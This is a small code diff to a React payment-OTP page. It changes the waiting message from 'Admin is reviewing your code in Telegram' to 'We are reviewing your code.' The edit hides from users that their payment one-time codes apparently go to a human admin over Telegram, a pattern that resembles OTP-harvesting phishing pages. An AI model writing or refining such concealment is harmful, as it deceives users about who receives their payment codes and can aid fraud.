@@ -179,7 +179,7 @@ export default function PaymentOtpPage({
           <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-cyan-500 mx-auto mb-4" />
           <h1 className="text-xl font-bold text-slate-900 dark:text-white mb-2">Verifying your code</h1>
           <p className="text-slate-500 text-sm">
-            Admin is reviewing your code in Telegram. This page updates automatically.
+            We are reviewing your code. This page updates automatically.
           </p>
           {pending?.transactionId && (
             <p className="mt-4 text-xs text-slate-400 font-mono">{pending.transactionId}</p>
